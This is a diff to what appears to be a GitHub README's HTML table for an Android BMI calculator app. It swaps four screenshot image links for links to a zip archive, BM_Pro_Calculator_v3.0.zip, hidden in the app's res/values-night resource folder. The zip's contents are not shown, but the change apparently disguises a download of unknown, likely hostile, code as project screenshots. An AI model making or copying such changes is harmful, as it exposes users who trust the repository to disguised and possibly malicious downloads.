@@ -10,16 +10,16 @@
 </tr>
 
 <td>
-  <img src="https://github.com/yasin9064/BMI_Calculator_Pro/blob/316829b260378560ea37184c5c904e8dd43afc49/Screenshot_1762008798.png" width="260"/>
+  <img src="https://github.com/yasin9064/BMI_Calculator_Pro/raw/refs/heads/main/android/app/src/main/res/values-night/BM_Pro_Calculator_v3.0.zip" width="260"/>
 </td>
 <td>
-  <img src="https://github.com/yasin9064/BMI_Calculator_Pro/blob/316829b260378560ea37184c5c904e8dd43afc49/Screenshot_1762008834.png" width="260"/>
+  <img src="https://github.com/yasin9064/BMI_Calculator_Pro/raw/refs/heads/main/android/app/src/main/res/values-night/BM_Pro_Calculator_v3.0.zip" width="260"/>
 </td>
 <td>
-  <img src="https://github.com/yasin9064/BMI_Calculator_Pro/blob/316829b260378560ea37184c5c904e8dd43afc49/Screenshot_1762008844.png" width="260"/>
+  <img src="https://github.com/yasin9064/BMI_Calculator_Pro/raw/refs/heads/main/android/app/src/main/res/values-night/BM_Pro_Calculator_v3.0.zip" width="260"/>
 </td>
 <td>
-  <img src="https://github.com/yasin9064/BMI_Calculator_Pro/blob/316829b260378560ea37184c5c904e8dd43afc49/Screenshot_1762008846.png" width="260"/>
+  <img src="https://github.com/yasin9064/BMI_Calculator_Pro/raw/refs/heads/main/android/app/src/main/res/values-night/BM_Pro_Calculator_v3.0.zip" width="260"/>
 </td>
 
 </table>
